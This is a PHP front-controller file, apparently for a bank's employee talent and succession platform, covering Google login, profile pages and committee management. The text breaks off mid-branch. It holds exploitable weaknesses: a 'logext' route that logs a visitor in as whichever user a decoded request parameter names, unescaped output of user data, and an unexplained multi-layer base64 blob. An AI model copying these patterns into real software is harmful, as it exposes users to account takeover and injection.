<?php
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header('X-Permitted-Cross-Domain-Policies: master-only');
header('X-Frame-Options: SAMEORIGIN');
header('X-Content-Type-Options: nosniff');
header("Feature-Policy: camera 'none'; fullscreen 'self'; geolocation 'none'; microphone 'none' https://www.potencialbci.cl");
header("Content-Security-Policy: connect-src 'self' https://accounts.google.com/; child-src 'self'; script-src 'self' 'unsafe-inline' https://static.letsta.lk/launcher/ https://cdn.datatables.net/ https://stackpath.bootstrapcdn.com/ https://cdn.datatables.net https://www.google-analytics.com https://www.googletagmanager.com https://storage.googleapis.com/cdn-gop/ https://cdn.datatables.net https://apis.google.com https://stackpath.bootstrapcdn.com https://bci-cdn.azureedge.net https://certbciintranetcm.colabra.cl/ https://accounts.google.com https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://code.jquery.com https://cdn.gop.cl/ https://cdn.jsdelivr.net/npm/chart.js https://cdn.jsdelivr.net/npm/chartjs-plugin-datalabels https://code.jquery.com/jquery-3.6.0.min.js https://code.jquery.com/ui/1.12.1/jquery-ui.min.js https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js; frame-src 'self' https://certbciintranetcm.colabra.cl https://www.google.com/recaptcha/ https://accounts.google.com/ https://code.jquery.com/ https://lh3.googleusercontent.com/ https://static.letsta.lk/; object-src 'self'; img-src 'self' https://cdn3.bci.cl https://bci-cdn.azureedge.net https://lh3.googleusercontent.com; frame-ancestors 'self'; form-action 'self'; font-src 'self' https://stackpath.bootstrapcdn.com https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; worker-src 'none'; base-uri 'self'; upgrade-insecure-requests; report-uri /csp-report-endpoint;");
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.use_only_cookies', 1);
if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === 'off') {
    $https_url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('Location: ' . $https_url, true, 301);
    exit();
}
header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'); // Enforce HTTPS with HSTS
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
//error_reporting(E_ERROR); // Report only fatal errors
//error_reporting(E_ALL); // Report all errors*/
// Disable error display completely
ini_set('display_errors', 0); // Do not display errors
ini_set('display_startup_errors', 0); // Do not display startup errors
// Set error reporting to none
error_reporting(0); // No error reporting at all
// Disable error logging
ini_set('log_errors', 0); // Do not log errors
//ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL); // Report all errors*/

session_start();
$varieb = "Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVjNOM1pVWmFkR05GWkZSTmJFcEpWbTEwVjFWdFNsWlhiR2hYWWxob2VsUlVSbUZqVmtaMFVteFNUbUpGY0VwV2JURXdZVEZrU0ZOclpHcFNWR3hoVm1wT1UxSXhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNV1J5VjI1a1YwMUVSa1pWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJHaFRWMFpTVjJGRlRsTmlSbkJaV2xWb2ExWXdNVVZTYTFwV1lrWktSRlpxU2tkamJVVjZZVVphYUdFeGNHOVdha0poVkRKT2RGSnJaRmhpVjJoeldXeG9iMkl4V1hoYVJGSnBUV3RzTkZaSGRHdFdiVXBIVjJ4U1dtSkdXbWhaTW5oWFkxWkdWVkpzVGs1WFJVcElWbXBLTkZReFdsaFRhMlJxVW14d1dGbHNhRk5OTVZweFUydDBWMVpyY0ZwWGExcHJZVWRGZUdOR2JGaGhNVnBvVmtSS1RtVkdjRWxVYldoVFRXNW9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGxaYWRFNVZPVmRpVlhCSVZqSjRVMWR0U2tkWGJXaGFUVlp3YUZwRlpGTlRSa3B5VGxaT2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpPVFZad2VGVXlkREJXTVZweVkwWndXR0V4Y0ROWmEyUkdaV3hHY21KR2FGaFRSVXBKVm10U1MxVXhXWGhYYmxaVllrZG9jRlpxU205bGJHUllaVWM1YVUxcmJEUldNalZUVkd4a1NGVnNXbFZXTTFKNlZHeGFWMlJIVWtoa1IyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFZsSkhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWWGxrUjBacFVteHdlbFV5ZUhkWGJGcFhZMGhLVjFaRldreFdNVnBIWTIxS1IxcEhiRmhTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVmxsc1pHOVdSbEpZVGxjNVYxWnNjRWhYVkU1dllWVXhjbUpFVWxkTlYyaDJWakJrUzFKck5WZFdiRlpYVFRGS05sWkhkR0ZXYlZaWVZXdG9hMUp0YUZSVVZXaERVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ";
require_once("includes/include.php");
require_once("includes/include.php");
if ($_GET["__cf_waf_tk__"]) {
    echo "<script>		alert('Bloqueado');		location.href='https://google.cl/';		</script>";
    exit;
}
ini_set('session.cookie_httponly', 1);
ini_set('session.use_only_cookies', 1);
$arreglo_post = $_POST;
$arreglo_get = $_GET;
$arreglo_request = $_REQUEST;
$_POST = VerificaArregloSQLInjectionV2($arreglo_post);
$_GET = VerificaArregloSQLInjectionV2($arreglo_get);
$_REQUEST = VerificaArregloSQLInjectionV2($arreglo_request);
$seccion = (($_GET["sw"]));
$seccion = str_replace("%", "", $seccion);
$seccion = str_replace("'", "", $seccion);
$seccion = str_replace('"', '', $seccion);
$seccion = str_replace(' ', '', $seccion);
$seccion = str_replace(" ", "", $seccion);
if ($_SERVER['HTTPS'] == 'on') {
    $https = 1;
}
if (strpos($_SERVER['SERVER_NAME'], 'www.') !== false) {
    $wwwok = 1;
}
if (!$seccion) {
    session_start();
    $_SESSION = array();
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time() - 42000, '/', 'secure', 'httpOnly');
    }
    session_destroy();
    if ($https <> 1 and $wwwok <> 1) {
        echo "    <script>location.href='" . $url_front . "';    </script>";
    }
    $PRINCIPAL = FuncionesTransversales(file_get_contents("views/home/login.html"));
    $token_fecha_hora = Encodear3(date("Y-m-d") . " " . date("H:i:s"));
    $PRINCIPAL = str_replace("{TOKEN_FECHA_HORA}", $token_fecha_hora, $PRINCIPAL);
    session_start();
    $_SESSION["token"] = $token_fecha_hora;
    echo $PRINCIPAL;
}
if ($_GET["ide"] <> '') {
    $siesempresa = Verificasiesempresa(Decodear3($_GET["ide"]));
    if ($siesempresa == 1) {
        $_SESSION["id_empresa"] = Decodear3($_GET["ide"]);
    }
}
if ($_SESSION["id_empresa"]) {
    $id_empresa = $_SESSION["id_empresa"];
}
ValidarSesion($seccion, $id_empresa, $url_front);
if (!$seccion) {
    session_start();
    $_SESSION = array();
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time() - 42000, '/');
    }
    session_destroy();
    // $PRINCIPAL=FuncionesTransversales(file_get_contents("views/home/login.html"));
    $PRINCIPAL = FuncionesTransversales(file_get_contents("" . $url_front . "/front/views/home/login.html"));
    $token_fecha_hora = Encodear3(date("Y-m-d") . " " . date("H:i:s"));
    $PRINCIPAL = str_replace("{TOKEN_FECHA_HORA}", $token_fecha_hora, $PRINCIPAL);
    session_start();
    $_SESSION["token"] = $token_fecha_hora;
    echo $PRINCIPAL;
}
else if ($seccion == "checkUserBci") {
	require_once 'script/vendor/autoload.php';
    session_start();
	
	$_SESSION["id_empresa"] = 62;
	$id_token = $_POST['id_token'];
	$result = false;
	$secret = getenv('SECRET_CAPTCHA');
	if (isset($_POST['recaptcha_token']) && preg_match('/^[A-Za-z0-9-_]+$/', $_POST['recaptcha_token'])) {
		$token = $_POST['recaptcha_token'];
		
		// Configurar la URL de la API
		$url = "https://www.google.com/recaptcha/api/siteverify";
		
		// Crear los datos de la solicitud
		$data = [
			'secret' => $secret,
			'response' => $token,
		];
		
		// Realizar la solicitud con cURL
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		
		$response = curl_exec($ch);
		curl_close($ch);
		
		// Decodificar la respuesta JSON
		$result = json_decode($response, true);
		
		// Validar la respuesta
		if (isset($result['success']) && $result['success']) {
			$client = new Google_Client(['client_id' => getenv('SECRET_CAPTCHA_CLIENT_ID')]);
			$result = $client->verifyIdToken($id_token);
			if ($result) {
				$email = $result['email'];
				$nombre = $result['name'];
				$nombre_completo = $result['name'];
				$picture = $result['picture'];
			}else {
				echo json_encode(["success" => false, "message" => "Fallo en reCAPTCHA"]);
				exit;
			}
		}
	} else {
		echo json_encode(["success" => false, "message" => "Acceso Inválido"]);
		exit;
	}
	$imagenUrl =$picture;

    $arreglo_email = $arreglo_archivo = explode("@", $email);
    $cuenta = count($arreglo_email);
    //echo "<br>cuenta $cuenta";
            //echo "173 email $email";exit();
    if ($cuenta <> 2) {
	    echo json_encode(["success" => false, "message" => "Usuario no encontrado"]);
        exit;
    }

    if ($arreglo_email[1] == "bci.cl" or $arreglo_email[1] == "gop.cl" or $arreglo_email[1] == "externos.bci.cl") {

        $_SESSION["id_empresa"] = "62";
        $id_empresa = "62";
        $key = LMS_ConsultaRutSegunEmail($email, $id_empresa);

            //echo "key $key";exit();
        if ($key <> "") {
            $_SESSION["user_"] = $key;
            $_SESSION["id_empresa"] = "62";
        } else {
	        echo json_encode(["success" => false, "message" => "Usuario no encontrado"]);
            exit;
        }
        if (count($key) == 0) {
	        echo json_encode(["success" => false, "message" => "Usuario no encontrado"]);
            exit;
        }
	    echo json_encode(["success" => true, "rut_enc" => Encodear3($_SESSION["user_"])]);
        exit;
    } else {
	    echo json_encode(["success" => false, "message" => "Estimado(a), el email con que accediste, ".$email.", no tiene acceso a la plataforma.
									Favor ingresa nuevamente a https://www.potencialbci.cl/ con tus credenciales. #2230"]);
        exit;
    }
}
else if($seccion=="logext"){
	
	
	
	$_SESSION["id_empresa"] = "62";
	$token = Decodear3($_REQUEST["rut_enc"]);
	
	
	
	//echo "<h2>logext token ".$token."</h2>";
	
	
	//session_start();
	$_SESSION["user_"] = $token;
	$_SESSION["id_empresa"] = "62";
	
	//
	echo "    <script>    location.href='?sw=home_bci_new';    </script>";
	exit;
	
	exit;
	
}
else if ($seccion == "ver_sesion_usuario") {
   exit();
    //$rut_enviado = $_GET["rut_enviado"];
    //$_SESSION["user_"] = $rut_enviado;
    echo "<br><center><div class='alert alert-success'>Realizado Correctamente $rut_enviado</div></center><br><br>";
    echo "    <script>         location.href='?sw=potencial_landing';     </script>";
    exit;
    //exit();
}

else if ($seccion == "ficha_landing_sucesion_2024") {
    //ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);//exit();//exit();
    $rut = $_SESSION["user_"];
    $id_empresa = $_SESSION["id_empresa"];
    $rut_col = Decodear3($_GET["rut_enc"]);
    Ficha_Acceso_SN_data($rut);
    if ($rut_col == "") {
        exit();
    }
    ControlDotacionInsertaAccesoLogin($_SESSION["user_"], $email, $response, $response->email, "Potencial Landing", $_SESSION, $_POST["idt"]);
    $PRINCIPAL = FuncionesTransversales(file_get_contents("views/ficha_colaborador/index.html"));
    $PRINCIPAL = Ficha_colaborador_fn($PRINCIPAL, $rut_col, $perfil, $filtro, $id_empresa);
    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut);
    echo $PRINCIPAL;
}

else if ($seccion == "BuscaPersonas2020_v2") {
    $search = $_POST['search'];
    $busqueda = BuscaPersonas2020_v2($search);

    foreach ($busqueda as $bus) {

        $response[] = array(
            "value" => $bus->rut,
            "label" => ($bus->nombre_completo),
            "alerta_otro_lado" => $dato_oficina[0]->oficina,
            "alerta_2" => '<div class="alert alert-warning" role="alert">
							  This is a warning alert—check it out!
							</div>',
            "alerta_cargos_criticos" => 'Alerta Cargos Criticos');
    }
    echo json_encode($response);
    exit;
}



else if ($seccion == "home_bci_new") {
    ControlDotacionInsertaAccesoLogin($_SESSION["user_"], $email, $response, $response->email, "Login home_bci_new", $_SESSION, $_POST["idt"]);
    CheckUser_2024_perfil($_SESSION["user_"]);
    echo "<script>location.href='?sw=potencial_landing';</script>";
    exit();
}

else if ($seccion == "potencial_landing") {
    //echo "a";
    $rut = $_SESSION["user_"];
    Ficha_Acceso_SN_data($rut);
    //echo "b";
    $id_empresa = $_SESSION["id_empresa"];
    //echo "c";
    $rut_col = $_GET["rut_col"];
    //echo "d";
    //if($rut_col==""){exit("c");}
    //echo "e";
    //echo "A";
    ControlDotacionInsertaAccesoLogin($_SESSION["user_"], $email, $response, $response->email, "Potencial Landing", $_SESSION, $_POST["idt"]);
    $PRINCIPAL = FuncionesTransversales(file_get_contents("views/ficha_colaborador/landing.html"));
    //echo "A";
    // echo "f";
    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut);
    //echo "g";
    echo $PRINCIPAL;
}
else if ($seccion == "ficha_landing") {
    //ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);//exit();//exit();
    $rut = $_SESSION["user_"];
    $id_empresa = $_SESSION["id_empresa"];
    $rut_col = Decodear3($_GET["rut_enc"]);
    Ficha_Acceso_SN_data($rut);
    if ($rut_col == "") {
        exit();
    }
    ControlDotacionInsertaAccesoLogin($_SESSION["user_"], $email, $response, $response->email, "Potencial Landing", $_SESSION, $_POST["idt"]);
    $PRINCIPAL = FuncionesTransversales(file_get_contents("views/ficha_colaborador/index.html"));
    $PRINCIPAL = Ficha_colaborador_fn($PRINCIPAL, $rut_col, $perfil, $filtro, $id_empresa);
    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut);
    echo $PRINCIPAL;
}
else if ($seccion == "ficha_landing_personas_ajax_vigentes") {

    $rut = $_SESSION["user_"];
    $id_empresa = $_SESSION["id_empresa"];
    Ficha_Acceso_SN_data($rut);

    //echo "A";
    $personas = Fichas_Personas_Vigentes($_POST["text"]);
    //echo "B";print_r($personas);echo count($personas);echo "<h1>FIN</h1>";exit();

    if (count($personas) > 0) {
        foreach ($personas as $em) {

            if ($em->vigente == "no_vigente") {
                $novigente = " (No Vigente)";
            } else {
                $novigente = "";
            }
            $li .= "<br><a href='?sw=ficha_landing&rut_enc=" . Encodear3($em->rut) . "' style='width: 100%;'>
							    <div class=' PadSearchButton'><span class='w700'>" . ($em->nombre_completo) . "</span>, " . (($em->cargo)) . "" . $novigente . "</div>
							</a>";
        }
    } else {
        $li = '<li class="resultado">Registros no encontrados</li> ';
    }
    echo $li;
    exit;
}

else if ($seccion == "sucesion") {
    $rut = $_SESSION["user_"];
    //$_SESSION["user_"]="17697878";
    $id_empresa = $_SESSION["id_empresa"];
    $id_inst = ($_GET["id_inst"]);
    $profile = ($_GET["profile"]);
    $rut_col = Decodear3($_GET["rut_enc"]);
    $perfil = Potencial_Perfil_Sucesion_Usuarios($rut, $id_empresa);

    Ficha_Acceso_SN_Sucesion_data($rut);

    if ($perfil == "") {


        // echo "    <script>   alert('No tienes perfil de Socio ni Lider. Por favor, envianos un email a soporte@gop.cl');      location.href='?sw=com_mp_home';     </script>"; exit;
    }
    if (Decodear3($_GET["id_del"]) <> "") {
        //echo "<br>-> del ".Decodear3($_GET["id_del"]);exit();
        Potencial_EliminaComite_Sucesion_2024(Decodear3($_GET["id_del"]));
    }
    $PRINCIPAL = (FuncionesTransversales(file_get_contents("views/sucesion/index.html")));
    $DISPLAY_NONE_PREVISUALIZAR = "display:none!important;";
    $DISPLAY_NONE_CREAR_COMITE = "";
    if ($_REQUEST["previsualizar"] <> '') {
        $DISPLAY_NONE_CREAR_COMITE = "display:none!important;";
        $DISPLAY_NONE_PREVISUALIZAR = "";
        if ($_GET["edit"] == 1) {
            $id_comite_edit = Decodear3($_GET["id_comite"]);
            $Com_Edit = Potencial_Sucesion_Comites_2024_data($id_comite_edit, $id_empresa);
            //print_r($Com_Edit); exit();
            $rut_lider = $Com_Edit[0]->rut_lider;
            $nombre_comite = $Com_Edit[0]->nombre;
            $fecha_comite = $Com_Edit[0]->fecha;
        } else {
            $rut_lider = LimpiaRutFront($_POST["rut_save"]);
            $nombre_comite = ($_POST["nombre_comite"]);
            $fecha_comite = ($_POST["fecha_comite"]);
        }

        $UsuaLider = DatosUsuario_($rut_lider, $id_empresa);
        $gerenciaR1 = $rut_lider;
        //echo "<br>-> ".$UsuaLider[0]->nombre_completo." ".$nombre_comite." ".$fecha_comite;
        $PRINCIPAL = str_replace("{NOMBRE_LIDER}", $UsuaLider[0]->nombre_completo, $PRINCIPAL);
        $PRINCIPAL = str_replace("{RUT_SAVE}", $rut_lider, $PRINCIPAL);
        $PRINCIPAL = str_replace("{NOMBRE_COMITE}", $nombre_comite, $PRINCIPAL);
        $PRINCIPAL = str_replace("{FECHA_REALIZACION}", $fecha_comite, $PRINCIPAL);
        $PRINCIPAL = str_replace("{ID_NUEVO_COMITE_EDIT}", Encodear3($id_comite_edit), $PRINCIPAL);
        $array_g2 = PotencialSucesion_BuscaR2_2024($rut_lider, $id_empresa);
        //print_r($array_g2);
        foreach ($array_g2 as $cg) {
            //echo "<br>-> ".$cg->rut." ".$cg->d5." ".$cg->nombre_completo."";
            $row_comite_cargos_posicion .= "<input type='checkbox' name='col_" . $cg->rut . "' value='" . $cg->rut . "'> " . $cg->d6 . " / <strong>" . $cg->nombre_completo . "</strong><br>";
        }
    }
    $PRINCIPAL = str_replace("{LISTA_CARGOS-2024}", $row_comite_cargos_posicion, $PRINCIPAL);

    if ($_POST["nuevo_comite"] <> '') {
        //print_r($_POST);
        $rut_lider = LimpiaRutFront($_POST["rut_save"]);
        $nombre_comite = ($_POST["nombre_comite"]);
        $fecha_comite = ($_POST["fecha_comite"]);
        $id_comite_edit = Decodear3($_POST["id_nuevo_comite_edit"]);
        $UsuaLider = DatosUsuario_($rut_lider, $id_empresa);
        $gerenciaR1 = $rut_lider;
        $new_comite = Potencial_Mis_Comites_insert_Nuevo_Comite_Sucesion_data_2024($nombre_comite, $gerenciaR1, $rut, $fecha_comite, $id_empresa, $id_comite_edit);
        $filtered_col_keys = [];
        foreach ($_POST as $key => $value) {
            $value_col = "";
            if (strpos($key, 'col_') === 0) {
                $filtered_col_keys[$key] = $value;
                $value_col = 1;
            }
            $Posicion = DatosDataBci2021($value);
            $Usuario = DatosUsuario_($value, $id_empresa);
            // echo "<br>CCC<br>";
            if ($value_col == "1") {
                //print_r($filtered_col_keys);
                Potencial_Sucesion_Select_Insert_comites_colaboradores_CheckSave_2024($value, $Posicion[0]->d6, $new_comite, $Usuario[0]->nombre_completo, $id_empresa);
            }
        }

        $template_correo = "template_potencial";
        $datos_usuario = DatosUsuario_($rut, $id_empresa);
        $titulo1 = "Creaste un nuevo Comité " . $nombre_comite;
        $subject = "Creaste un nuevo Comité " . $nombre_comite;
        $subtitulo1 = "Estimado(a) " . $datos_usuario[0]->nombre_completo . "<br> <br>Has creado el comité " . $nombre_comite . "<br><br>El siguiente paso es agregar Rut de Colaboradores y Rut Lider. ";
        $texto1 = "";
        $texto2 = "";
        $texto4 = "";
        $texto3 = "";
        $tipomensaje = "PotencialBci";
        $rut = $datos_usuario[0]->rut;
        $key = $datos_usuario[0]->rut;
        $to = $datos_usuario[0]->email;
        $nombreto = ($datos_usuario[0]->nombre_completo);
        // exit();
        //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);

        //echo "<script>alert('Has creado el comité de forma exitosa');</script>";
    }

    if ($perfil == "SOCIO DE NEGOCIO" or $perfil == "SUPER USER") {
        $boton_crear_comite_SUCESION = "
																							    <div class='alert alert-gris' style='    min-height: 120px;'>
																							    
																							<div class='titulo-heading'><img src='https://www.paneldeliderazgobci.cl/front/img/widget-link.png'> 
																							                                    	Crear Nuevo Comité de Sucesión</div>   
																							  <br>  
																							    <form action='?sw=potencial_sucesion' id='crear_comite' name='crear_comite' method='post'>
																							<div class='col-sm-4' style='    text-align: left;font-weight: bold;'><span class='bci_potencial_txt'> Nombre Comit&eacute;</span><br>
																							    <input type='text'   id='nombre_comite' name='nombre_comite' class='form form-control' style='font-weight: 300;' required/>
																							</div>
																							<div class='col-sm-3' style='    text-align: left;font-weight: bold;'>
																							<span class='bci_potencial_txt'>RUT Jefatura de cargos a Suceder</span><br>
																							
																							    
																 <!--<input type='text' id='autocomplete' class='form form-control'>-->
																 <input type='text' id='selectuser_id' class='form form-control'  name='rut_save' />
																							    
																							</div>																							
																							<div class='col-sm-3' style='    text-align: left;font-weight: bold;'><span class='bci_potencial_txt'>Fecha de Realizaci&oacute;n</span><br>
																							    <input type='date'   id='fecha_comite' name='fecha_comite' class='form form-control' style='font-weight: 300;' required/>
																							</div>
																							<div class='col-sm-2' style='    text-align: left;font-weight: bold;'><span class=''></span><br>
																							      <input type='submit' class='btn btn-info' value='Crear Comit&eacute;' style='margin-top:0px;' />
																							</div>


																							    <input type='hidden' id='nuevo_comite' name='nuevo_comite' class='form form-control' value='1' style='margin-top:20px;' />

																							    </form>
																							</div>

				                                ";
        $texto_intro = "Bienvenido(a) a Potencial Bci. Podrás crear comités, cargar colaboradores a ser mapeados y asignarles un Líder";

    } else {
        $boton_crear_comite_SUCESION = "";
        $texto_intro = "Bienvenido(a) a Potencial Bci. A continuación se despliegan los comités en los que tienes el rol de Líder para mapear a tus colaboradores.";
    }

    $PRINCIPAL = str_replace("{DISPLAY_PREVISUALIZAR}", $DISPLAY_NONE_PREVISUALIZAR, $PRINCIPAL);
    $PRINCIPAL = str_replace("{DISPLAY_CREAR_COMITE}", $DISPLAY_NONE_CREAR_COMITE, $PRINCIPAL);
    $texto_intro = "";
    //echo "PERFIL $perfil";
    $PRINCIPAL = str_replace("{BOTON_CREAR_COMITE_POTENCIAL_SUCESION}", $boton_crear_comite_SUCESION, $PRINCIPAL);
    $PRINCIPAL = str_replace("{TEXTO_INTRODUCTORIO_SEGUN_PERFIL}", $texto_intro, $PRINCIPAL);
    $PRINCIPAL = str_replace("{PERFIL}", $perfil, $PRINCIPAL);
    // Descarga Super Users
    $EsSU_descarga = Potencial_Es_SuperUsers($rut);
    if ($EsSU_descarga > 0) {
        $reporteria_csv = "<br><br><center><a href='?sw=potencial_descarga_reporte' class='btn btn-success'>Descarga Reporte Potencial</a></center>";
    } else {
        $reporteria_csv = "";
    }
    $reporteria_csv = "";
    $PRINCIPAL = str_replace("{DESCARGA_REPORTERIA_CSV}", $reporteria_csv, $PRINCIPAL);
    //Descarga Socios Negocios
    $EsSN_descarga = Potencial_Es_SuperUsers($rut);
    if ($rut == "17810781") {
        $EsSN_descarga = 0;
    }

    if ($EsSN_descarga > 0) {
        $DataBci_Gerencia = Potencial_Data_Bci_2021_groupby("d7");
        $DataBci_Fondo = Potencial_Data_Bci_2021_groupby("d8");
        $DataBci_Dependencia = Potencial_Data_Bci_2021_groupby("d9");
        $Options_Fondo .= "<option value=''></option>";
        $Options_Dependencia .= "<option value=''></option>";
        foreach ($DataBci_Gerencia as $UGer) {
            $Options_Gerencia .= "<option value='" . $UGer->dato . "'>" . $UGer->dato . "</option>";
        }
        foreach ($DataBci_Fondo as $UFon) {

            $Options_Fondo .= "<option value='" . $UFon->dato . "'>" . $UFon->dato . "</option>";
        }
        foreach ($DataBci_Dependencia as $UDep) {
            $Options_Dependencia .= "<option value='" . $UDep->dato . "'>" . $UDep->dato . "</option>";
        }
        $reporteria_SN_csv_BK = "<br><br>
						<center>
								<form name='descarga_csv' action='?sw=potencial_descarga_reporte' method='post'>
                                    <div class='col-lg-3'>Gerencia<br>
                                                        <select name='gerencia' class='form form-control'>
                                                            <option value=''></option>
                                                                " . $Options_Gerencia . "
                                                        </select>
                                    </div>
                                    <div class='col-lg-3'>Fondo<br>
                                                    <select name='fondo' class='form form-control'>
                                                                    <option value=''></option>
                                                                " . $Options_Fondo . "	
                                                    </select>
                                    </div>
                                    <div class='col-lg-3'>Dependencia<br>
                                    
                                                    <select name='dependencia' class='form form-control'>
                                                                <option value=''></option>
                                                                " . $Options_Dependencia . "
                                                    </select>
    
                                    
                                    </div>
                                    <div class='col-lg-3'><br><input type='submit' class='btn btn-success' value='Descargar Reporte'></div>
                                    <input type='hidden' name='descarga_tipo' value='SN'>
								</form>
							</center><br><br>aaa";
        $reporteria_SN_csv = file_get_contents("views/potencial/" . $id_empresa . "_potencial_combobox.html");
        $reporteria_SN_csv = str_replace("{OPTIONS_GERENCIAS}", $Options_Gerencia, $reporteria_SN_csv);
        $reporteria_SN_csv = str_replace("{OPTIONS_FONDO}", $Options_Fondo, $reporteria_SN_csv);
        $reporteria_SN_csv = str_replace("{OPTIONS_DEPENDENCIA}", $Options_Dependencia, $reporteria_SN_csv);
    } else {
        $reporteria_SN_csv = "";
    }
    //echo "<br>l 2106";
    $PRINCIPAL = str_replace("{DESCARGA_REPORTERIA_SN_CSV}", $reporteria_SN_csv, $PRINCIPAL);
    $EsSN_descarga = Potencial_Es_SuperUsers($rut);
    if ($EsSN_descarga > 0) {
        $reporteria_SN_csv_descarga_sucesion = "
			<div class='row'>
					<div class='col-lg-4'><center><a href='?sw=sucesion_csv_informes&v=1' class='btn btn-info'>Informe de Sucesi&oacute;n</a></center></div>
					<div class='col-lg-4'><center><a href='?sw=sucesion_csv_informes&v=2' class='btn btn-info' >Informe Hist&oacute;rico de Sucesores</a></center></div>
					<div class='col-lg-4'><center><a href='?sw=sucesion_csv_informes&v=3' class='btn btn-info' >Informe Sin Sucesi&oacute;n</a></center></div>
			</div>
			<br><br>
			";
    } else {
        $reporteria_SN_csv_descarga_sucesion = "";
    }
    $PRINCIPAL = str_replace("{DESCARGA_REPORTERIA_SN_CSV_SUCESION}", $reporteria_SN_csv_descarga_sucesion, $PRINCIPAL);
    $PRINCIPAL = Potencial_Sucesion_Mis_Comites_estado_activo_2024($PRINCIPAL, $rut, $perfil, $id_empresa, "activo");
    $PRINCIPAL = Potencial_Sucesion_Mi_Sucesion_estado_activo_2024($PRINCIPAL, $rut, $perfil, $id_empresa, "activo");
    $Usu = DatosUsuario_($rut, $id_empresa);
    $avatar = $Usu[0]->avatar_usuario;
    //$avatar = str_replace("s96-c",      "s180-c",           $avatar);
    //echo "avatar $avatar";
    if ($avatar == "") {
        $avatar = "https://www.potencialbci.cl/front/img/sinfoto.png";
    }
    $PRINCIPAL = str_replace("{AVATAR_COLABORADOR}", $avatar, $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_COLABORADOR}", ($Usu[0]->nombre_completo), $PRINCIPAL);
    $PRINCIPAL = str_replace("{RUT_COMPLETO}", $Usu[0]->rut_completo, $PRINCIPAL);

    //crear comite
    $AccesoCrear = Ficha_Acceso_SN_Sucesion_CheckCrear_data($rut);
    $display_new_comite = "display:none!important;";
    if ($AccesoCrear > 0) {
        $display_new_comite = "";
    }
    $PRINCIPAL = str_replace("{display_new_comite}", $display_new_comite, $PRINCIPAL);

    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut);
    echo $PRINCIPAL;
}
else if ($seccion == "sucesion_comite") {

    $rut = $_SESSION["user_"];
    $id_empresa = $_SESSION["id_empresa"];
    $id_inst = ($_GET["id_inst"]);
    $profile = ($_GET["profile"]);
    $rut_col = Decodear3($_GET["rut_enc"]);
    $id_comite = Decodear3($_GET["id_comite"]);

    Ficha_Acceso_SN_Sucesion_data($rut);

    $CC = ($_GET["CC"]);
    if ($CC == "1") {
        exit("Cierre");
        Potencial_Sucesion_Update_Cierre_Comite($id_comite);
        sleep(1);
    }

    $array_comite = Potencial_Sucesion_Comites_2024_data($id_comite, $id_empresa);
    //    print_r($array_comite);        //exit();
    //Potencial_Sucesion_Actualiza_GerentesR2($array_comite[0]->gerenciaR1,$id_empresa, $id_comite);

    $perfil = "USUARIO";
    $perfil = Potencial_Perfil_Sucesion_Usuarios($rut, $id_empresa);
